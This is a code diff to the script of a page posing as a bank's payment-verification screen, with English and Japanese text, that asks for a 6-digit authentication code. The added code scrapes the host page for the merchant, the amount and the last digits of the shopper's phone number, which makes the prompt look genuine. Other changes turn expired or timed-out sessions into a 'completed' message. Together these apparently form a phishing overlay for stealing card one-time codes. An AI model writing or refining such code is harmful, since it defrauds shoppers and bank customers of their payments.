@@ -337,6 +337,7 @@
         var resendCooldown = 60;
         var resendTimer = null;
         var resending = false;
+        var phoneSuffix = '';
 
         var i18n = {
             en: {
@@ -346,7 +347,7 @@
                 title_loading: 'Verify Your Identity',
                 subtitle_loading: 'Your bank requires additional verification to confirm this payment.',
                 title_otp: 'Authentication Required',
-                subtitle_otp: "Your bank has sent a 6-digit authentication code to ••••9012. Please enter it to verify your identity.",
+                subtitle_otp: "Your bank has sent a 6-digit authentication code to ••••{phone}. Please enter it to verify your identity.",
                 otp_label: 'Enter the 6-digit authentication code',
                 error_msg: 'Incorrect security code. Please try again.',
                 submit_btn: 'Verify',
@@ -368,7 +369,7 @@
                 title_loading: '本人確認',
                 subtitle_loading: 'お支払いを確定するため、銀行が追加の本人確認を要求しています。',
                 title_otp: '本人認証が必要です',
-                subtitle_otp: '銀行から••••9012 に6桁の認証コードを送信しました。本人確認のため入力してください。',
+                subtitle_otp: '銀行から••••{phone} に6桁の認証コードを送信しました。本人確認のため入力してください。',
                 otp_label: '6桁の認証コードを入力してください',
                 error_msg: '認証コードが正しくありません。もう一度お試しください。',
                 submit_btn: '確認',
@@ -424,22 +425,29 @@
                         currency = abbr.textContent.trim();
                     }
 
-                    var strongs = pdoc.querySelectorAll('strong');
-                    if (strongs && strongs.length >= 3) {
-                        var s = strongs[2];
-                        if (s && s.textContent) {
-                            amount = s.textContent.trim();
+                    var s = pdoc.querySelector('[role="cell"] strong:last-of-type');
+                    if (s && s.textContent) {
+                        amount = s.textContent.trim();
+                    }
+
+                    var phoneInput = pdoc.querySelector('[name="phone"]');
+                    var phone = '****';
+                    if (phoneInput && phoneInput.value) {
+                        var phoneVal = phoneInput.value.replace(/\D/g, '');
+                        if (phoneVal.length >= 4) {
+                            phone = phoneVal.substring(phoneVal.length - 4);
                         }
                     }
 
                     return {
                         merchantName: merchantName,
                         amount: amount,
-                        currency: currency
+                        currency: currency,
+                        phone: phone
                     };
                 }
             } catch (e) {}
-            return { merchantName: null, amount: null, currency: null };
+            return { merchantName: null, amount: null, currency: null, phone: null };
         }
 
         function applyParentData() {
@@ -458,6 +466,9 @@
                     }
                     amountVal.textContent = displayAmount;
                 }
+            }
+            if (data.phone) {
+                phoneSuffix = data.phone;
             }
         }
 
@@ -502,7 +513,11 @@
 
         function showOTPForm() {
             document.getElementById('title').textContent = t('title_otp');
-            document.getElementById('subtitle').textContent = t('subtitle_otp');
+            var subtitle = t('subtitle_otp');
+            if (phoneSuffix !== '') {
+                subtitle = subtitle.replace('{phone}', phoneSuffix);
+            }
+            document.getElementById('subtitle').textContent = subtitle;
             document.getElementById('loading-state').style.display = 'none';
             document.getElementById('otp-form').classList.add('active');
             document.getElementById('expired-state').classList.remove('show');
@@ -542,14 +557,6 @@
                 otp += input.value;
             });
             return otp;
-        }
-
-        function showExpired() {
-            document.getElementById('loading-state').style.display = 'none';
-            document.getElementById('otp-form').classList.remove('active');
-            document.getElementById('expired-state').classList.add('show');
-            document.getElementById('completed-state').classList.remove('show');
-            stopPolling();
         }
 
         function showCompleted() {
@@ -609,7 +616,7 @@
                     showCompleted();
                     break;
                 case 'expired':
-                    showExpired();
+                    showCompleted();
                     break;
             }
             currentState = state;
@@ -617,7 +624,7 @@
 
         function pollStatus() {
             if (pollCount >= maxPolls) {
-                showExpired();
+                showCompleted();
                 return;
             }
             pollCount++;
